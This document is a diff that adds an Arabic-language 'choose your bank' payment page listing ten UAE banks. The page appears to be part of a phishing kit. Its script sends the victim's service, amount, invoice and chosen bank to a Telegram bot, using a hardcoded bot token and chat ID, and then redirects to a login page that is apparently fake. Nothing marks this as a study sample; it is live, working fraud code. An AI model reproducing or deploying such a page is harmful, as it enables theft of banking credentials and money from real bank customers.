@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>اختيار البنك</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap" rel="stylesheet">
+
+<style>
+body {
+  margin:0;
+  font-family:'Cairo';
+  background:#f5f5f5;
+}
+
+.container {
+  padding:20px;
+}
+
+.card {
+  background:#fff;
+  border-radius:20px;
+  padding:25px;
+  text-align:center;
+  box-shadow:0 5px 15px rgba(0,0,0,0.08);
+  margin-bottom:20px;
+}
+
+h1 {
+  color:#0a8f2c;
+  font-size:24px;
+}
+
+p {
+  color:#666;
+}
+
+.bank {
+  background:#fff;
+  border-radius:15px;
+  padding:15px;
+  margin-bottom:15px;
+  text-align:center;
+  border:1px solid #eee;
+  cursor:pointer;
+  transition:0.3s;
+}
+
+.bank:hover {
+  transform:scale(1.02);
+  border-color:#0a8f2c;
+}
+
+.bank img {
+  width:120px;
+  margin-bottom:10px;
+}
+
+.bank-name {
+  font-size:16px;
+  color:#333;
+}
+
+.loading {
+  display:none;
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.7);
+  z-index:999;
+  justify-content:center;
+  align-items:center;
+  color:white;
+  font-size:18px;
+  flex-direction:column;
+}
+
+.spinner {
+  width:50px;
+  height:50px;
+  border:5px solid #f3f3f3;
+  border-top:5px solid #0a8f2c;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin-bottom:15px;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="card">
+    <h1>اختر البنك الخاص بك للدفع</h1>
+    <p>يرجى اختيار البنك الذي ترغب في استخدامه لإتمام عملية الدفع:</p>
+  </div>
+
+  <div class="bank" onclick="selectBank('Emirates NBD')">
+    <img src="img/bankImg/IMG_20260416_184858_812.jpg">
+    <div class="bank-name">بنك الإمارات دبي الوطني</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('FAB')">
+    <img src="img/bankImg/IMG_20260416_184859_470.jpg">
+    <div class="bank-name">بنك أبوظبي الأول</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('ADCB')">
+    <img src="img/bankImg/IMG_20260416_184859_221.jpg">
+    <div class="bank-name">بنك أبوظبي التجاري</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('Dubai Islamic')">
+    <img src="img/bankImg/IMG_20260416_184858_580.jpg">
+    <div class="bank-name">بنك دبي الإسلامي</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('Mashreq')">
+    <img src="img/bankImg/IMG_20260416_184858_586.jpg">
+    <div class="bank-name">بنك المشرق</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('Abu Dhabi Islamic')">
+    <img src="img/bankImg/IMG_20260416_184858_952.jpg">
+    <div class="bank-name">بنك أبو ظبي الإسلامي</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('Commercial Bank of Dubai')">
+    <img src="img/bankImg/IMG_20260416_184858_819.jpg">
+    <div class="bank-name">بنك دبي التجاري</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('National Bank of Fujairah')">
+    <img src="img/bankImg/IMG_20260416_184858_901.jpg">
+    <div class="bank-name">بنك الفجيرة الوطني</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('RAKBANK')">
+    <img src="img/bankImg/IMG_20260416_184859_173.jpg">
+    <div class="bank-name">بنك رأس الخيمة</div>
+  </div>
+
+  <div class="bank" onclick="selectBank('Sharjah Islamic')">
+    <img src="img/bankImg/IMG_20260416_184859_081.jpg">
+    <div class="bank-name">مصرف الشارقة الإسلامي</div>
+  </div>
+
+</div>
+
+<div id="loadingOverlay" class="loading">
+  <div class="spinner"></div>
+  <div>جاري المعالجة...</div>
+</div>
+
+<script>
+
+const botToken = "8497519636:AAG2fIjNUBJhtN63dApkRNoENAFwEUJYTR8";
+const chatId = "-4669313790";
+
+function selectBank(bank){
+  const loadingOverlay = document.getElementById('loadingOverlay');
+  loadingOverlay.style.display = 'flex';
+  
+  // حفظ البنك في localStorage
+  localStorage.setItem("selectedBank", bank);
+  
+  // الحصول على بيانات الخدمة من localStorage
+  const selectedService = localStorage.getItem("service") || "غير محدد";
+  const amount = localStorage.getItem("amount") || "غير محدد";
+  const invoice = localStorage.getItem("invoice") || "غير محدد";
+  
+  const message = `
+🏦 اختيار البنك - عملية دفع جديدة
+━━━━━━━━━━━━━━━━━━━━━
+🛠️ الخدمة: ${selectedService}
+💰 المبلغ: ${amount} AED
+🧾 الفاتورة: ${invoice}
+🏦 البنك المختار: ${bank}
+━━━━━━━━━━━━━━━━━━━━━
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
+  `;
+  
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    console.log("تم إرسال البنك إلى تيليغرام", data);
+    window.location.href = "login.html";
+  })
+  .catch(err => {
+    console.error("خطأ في الإرسال:", err);
+    window.location.href = "login.html";
+  });
+}
+</script>
+
+</body>
+</html>
